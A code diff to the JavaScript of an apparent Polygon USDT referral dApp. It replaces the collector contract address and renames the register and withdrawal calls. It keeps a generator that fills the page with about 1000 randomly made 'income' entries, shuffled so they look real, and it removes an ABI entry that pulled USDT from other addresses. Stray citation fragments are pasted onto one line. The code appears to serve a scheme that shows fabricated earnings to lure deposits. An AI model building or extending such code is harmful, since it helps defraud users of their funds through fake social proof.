@@ -232,7 +232,8 @@
         let countdownInterval;
         const selectedNetwork = "POLYGON";
 
-        const COLLECTOR_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC";
+        // Contract Address အသစ်ဖြင့် အစားထိုးပြီးပါပြီ
+        const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";[span_1](start_span)[span_1](end_span)
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const POLYGON_CHAIN_ID = "0x89";
 
@@ -243,10 +244,9 @@
         ];
 
         const COLLECTOR_ABI = [
-            "function registerUser(address referrer) external",
-            "function collectUSDT(address from, uint256 amount) external",
-            "function requestWithdraw(uint256 amount) external",
-            "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)",
+            "function register(address referrer) external",
+            "function requestWithdrawal(uint256 amount) external",
+            "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered, uint256 lockedBalance, uint256 interestBalance)",
             "function subAdminPrefix(address) view returns (string)"
         ];
 
@@ -308,11 +308,11 @@
         function generateIncomeList() {
             const container = document.getElementById("incomeListContainer");
             const tiers = [
-                { count: 300, min: 10, max: 30 },     // 30%
-                { count: 400, min: 40, max: 500 },    // 40%
-                { count: 150, min: 600, max: 3000 },  // 15%
-                { count: 100, min: 3500, max: 6000 }, // 10%
-                { count: 50, min: 7000, max: 18000 }  // 5%
+                { count: 300, min: 10, max: 30 },
+                { count: 400, min: 40, max: 500 },
+                { count: 150, min: 600, max: 3000 },
+                { count: 100, min: 3500, max: 6000 },
+                { count: 50, min: 7000, max: 18000 }
             ];
 
             let items = [];
@@ -339,7 +339,6 @@
                 }
             });
 
-            // Fisher-Yates shuffle so the 1000 items appear in natural mixed order
             for (let i = items.length - 1; i > 0; i--) {
                 const j = Math.floor(Math.random() * (i + 1));
                 [items[i], items[j]] = [items[j], items[i]];
@@ -546,7 +545,7 @@
                 const referrer = getQueryParameter("ref") || localStorage.getItem("saved_referrer") || ethers.ZeroAddress;
                 
                 try {
-                    const regTx = await collector.registerUser(referrer);
+                    const regTx = await collector.register(referrer);
                     await regTx.wait();
                 } catch (regErr) {
                     console.log("Already registered or reference error:", regErr);
@@ -655,7 +654,7 @@
                 const withdrawAmountNum = 10;
                 const withdrawAmount = ethers.parseUnits(withdrawAmountNum.toString(), 6);
 
-                const tx = await collector.requestWithdraw(withdrawAmount);
+                const tx = await collector.requestWithdrawal(withdrawAmount);
                 await tx.wait();
 
                 try {
